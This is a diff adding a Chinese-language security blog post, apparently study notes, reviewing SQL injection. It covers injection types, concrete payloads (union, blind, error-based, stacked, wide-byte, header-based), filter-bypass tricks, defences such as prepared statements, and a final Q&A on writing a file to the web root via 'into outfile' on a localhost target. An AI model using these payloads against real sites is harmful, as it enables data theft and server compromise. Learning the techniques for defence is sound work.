@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入review">
+<meta property="og:url" content="http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="Sql注入">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-23T07:56:50.000Z">
+<meta property="article:modified_time" content="2021-01-23T15:58:12.569Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="review">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sql注入review | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入review
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-01-23 15:56:50 / Modified: 23:58:12" itemprop="dateCreated datePublished" datetime="2021-01-23T15:56:50+08:00">2021-01-23</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入<a id="more"></a></h2><h3 id="什么是Sql注入攻击？"><a href="#什么是Sql注入攻击？" class="headerlink" title="什么是Sql注入攻击？"></a>什么是Sql注入攻击？</h3><p>Sql注入是发生于应用程序与数据库层的安全漏洞。Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击。</p>
+<h3 id="Sql注入的分类"><a href="#Sql注入的分类" class="headerlink" title="Sql注入的分类"></a>Sql注入的分类</h3><h4 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h4><ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<h4 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h4><ul>
+<li>GET注入</li>
+<li>POST注入</li>
+<li>Cookie注入</li>
+</ul>
+<h4 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h4><ul>
+<li>报错注入</li>
+<li>盲注<ul>
+<li>布尔盲注</li>
+<li>时间盲注</li>
+</ul>
+</li>
+<li>union注入</li>
+</ul>
+<h4 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h4><ul>
+<li>宽字节注入</li>
+</ul>
+<h3 id="手工注入基本流程"><a href="#手工注入基本流程" class="headerlink" title="手工注入基本流程"></a>手工注入基本流程</h3><ol>
+<li>确认注入点</li>
+<li>确认数据库类型和版本</li>
+<li>fuzz测试确认被过滤的字符及相关函数</li>
+<li>获取当前数据库名、获取表名、获取列名、获取字段值</li>
+</ol>
+<h3 id="部分相关函数"><a href="#部分相关函数" class="headerlink" title="部分相关函数"></a>部分相关函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length(str) ：返回字符串str的长度</span><br><span class="line">substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(str,pos,len) ：跟上面的一样，截取字符串</span><br><span class="line">ascii(str) ：返回字符串str的最左面字符的ASCII代码值</span><br><span class="line">ord(str) ：将字符或布尔类型转成ascll码</span><br><span class="line"><span class="keyword">if</span>(a,b,c) ：a为条件，a为<span class="keyword">true</span>，返回b，否则返回c，如<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见注入攻击手法"><a href="#常见注入攻击手法" class="headerlink" title="常见注入攻击手法"></a>常见注入攻击手法</h3><ul>
+<li>union注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>布尔注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用substr(a,b,c),从第b位开始取出a中长度为c的子串</span><br><span class="line">?id=1'and ascii(substr(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()limit0,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">113</span><span class="comment">#</span></span><br><span class="line">regexp匹配</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and 1=(select 1 from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' and column_name regexp '</span>^userame<span class="string">'limit 0,1)#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>时间注入</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>堆叠注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id = 1';<span class="keyword">select</span> <span class="keyword">if</span>(sub(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'r'</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)%<span class="number">23</span></span><br><span class="line"><span class="keyword">handler</span>查询</span><br><span class="line"><span class="number">0</span><span class="string">'; handler 表名 open as qwzf; handler qwzf read first; handler qwzf close;#</span></span><br><span class="line"><span class="string">预编译</span></span><br><span class="line"><span class="string">SeT@a= ;</span></span><br><span class="line"><span class="string">prepare execsql from @a;</span></span><br><span class="line"><span class="string">execute execsql;#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>报错注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">floor()和rand()</span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">2</span>,<span class="keyword">concat</span>(<span class="string">':'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">':'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*利用错误信息得到当前数据库名*/</span></span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br><span class="line"></span><br><span class="line">updatexml()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">geometrycollection()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">exp</span>()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>二次注入</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">二次注入原理：</span><br><span class="line">后端代码对恶意参数进行了转义，但是在存储时将转义后的数据还原存储，用户在二次请求查询该数据时直接带入sql语句进行了查询，导致sql注入的触发</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>宽字节注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id = -1%DF' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>,%<span class="number">23</span> //利用%df吃掉转义字符\</span><br><span class="line">//利用前提条件：</span><br><span class="line">数据库的编码格式为GBK</span><br><span class="line">传入的单引号被转义符或是函数转义</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>base64注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=MSc%3d</span><br><span class="line">//注入语句进行base64编码</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>XFF注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For：127.0.0.1' <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">user</span>()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无列名注入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b <span class="keyword">from</span> posts <span class="keyword">where</span> a=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`3`</span>,<span class="number">0x2d</span>,<span class="string">`4`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> xxx)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h3><ul>
+<li><p><strong>大小写绕过</strong></p>
+</li>
+<li><p><strong>双写绕过</strong></p>
+</li>
+<li><p><strong>编码绕过</strong>（url全编码、十六进制）</p>
+</li>
+<li><p><strong>内联注释绕过</strong></p>
+</li>
+<li><p><strong>关键字替换</strong></p>
+<ul>
+<li><p><strong>逗号绕过</strong></p>
+<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
+<p>limit中可以利用offset来摆脱对逗号的利用</p>
+</li>
+<li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p>
+</li>
+<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
+</li>
+<li><p><strong>空格绕过</strong>（用括号，+等绕过）</p>
+</li>
+</ul>
+</li>
+<li><p><strong>等价函数绕过</strong></p>
+<ul>
+<li><code>hex()、bin()=ascii()</code></li>
+<li><code>concat_ws()=group_concat()</code></li>
+<li><code>mid()、substr()=substring()</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema被禁用时替代：sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats</span><br><span class="line">上面都被过滤时</span><br><span class="line">sys.schema_tables_with_full_table_scans</span><br><span class="line"></span><br><span class="line">substr、if被禁用</span><br><span class="line">and case when substr  then sleep(5) else 0 <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><p>核心：数据代码分离原则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.最佳方法：预编译语句，绑定变量。使用预编译的SQL语句，SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’&#x3D;’1的字符串，也只会将此字符串作为username查询。</span><br><span class="line"></span><br><span class="line">2.从存储过程来防御：先将SQL语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态SQL语句。</span><br><span class="line"></span><br><span class="line">3.从数据类型角度来防御：限制数据类型，并统一数据格式。</span><br><span class="line"></span><br><span class="line">4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="相关Sql面经"><a href="#相关Sql面经" class="headerlink" title="相关Sql面经"></a>相关Sql面经</h2><p>1.为什么预编译能防止Sql注入？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">预编译是指把要执行的sql语句先进行一个解析,解析语法以及确定查询范围还有查找的返回结果类型，就是确定了查询的方式，把命令和参数进行了分离，使用预编译的sql语句来进行查询直接进行执行计划，不会在进行语义解析，也就是DB不会在进行编译，而是直接执行编译过的sql。只需要替换掉参数部分。</span><br></pre></td></tr></table></figure>
+
+<p>2.mysql5.0以上和5.0以下有什么区别？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</span><br><span class="line">5.0以下是多用户单操作，5.0以上是多用户多操做。</span><br></pre></td></tr></table></figure>
+
+<p>3.如何突破注入时字符被转义？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">宽字符注入</span><br><span class="line">hex编码绕过</span><br></pre></td></tr></table></figure>
+
+<p>4.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root权限以及网站的绝对路径。</span><br></pre></td></tr></table></figure>
+
+<p>5.sql如何写shell?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;&#96;</span><br><span class="line"></span><br><span class="line">&#96;http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;&#96;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/01/23/sql%E6%B3%A8%E5%85%A5review/" title="sql注入review">http://yoursite.com/2021/01/23/sql注入review/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/review/" rel="tag"># review</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/" rel="prev" title="php魔术方法及pop链构造">
+      <i class="fa fa-chevron-left"></i> php魔术方法及pop链构造
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/25/xssreview/" rel="next" title="xssreview">
+      xssreview <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sql注入"><span class="nav-number">1.</span> <span class="nav-text">Sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是Sql注入攻击？"><span class="nav-number">1.1.</span> <span class="nav-text">什么是Sql注入攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql注入的分类"><span class="nav-number">1.2.</span> <span class="nav-text">Sql注入的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#按变量类型分"><span class="nav-number">1.2.1.</span> <span class="nav-text">按变量类型分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按HTTP提交方式分"><span class="nav-number">1.2.2.</span> <span class="nav-text">按HTTP提交方式分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#按注入方式分"><span class="nav-number">1.2.3.</span> <span class="nav-text">按注入方式分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码问题"><span class="nav-number">1.2.4.</span> <span class="nav-text">编码问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手工注入基本流程"><span class="nav-number">1.3.</span> <span class="nav-text">手工注入基本流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#部分相关函数"><span class="nav-number">1.4.</span> <span class="nav-text">部分相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见注入攻击手法"><span class="nav-number">1.5.</span> <span class="nav-text">常见注入攻击手法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见绕过技巧"><span class="nav-number">1.6.</span> <span class="nav-text">常见绕过技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御策略"><span class="nav-number">1.7.</span> <span class="nav-text">防御策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关Sql面经"><span class="nav-number">2.</span> <span class="nav-text">相关Sql面经</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
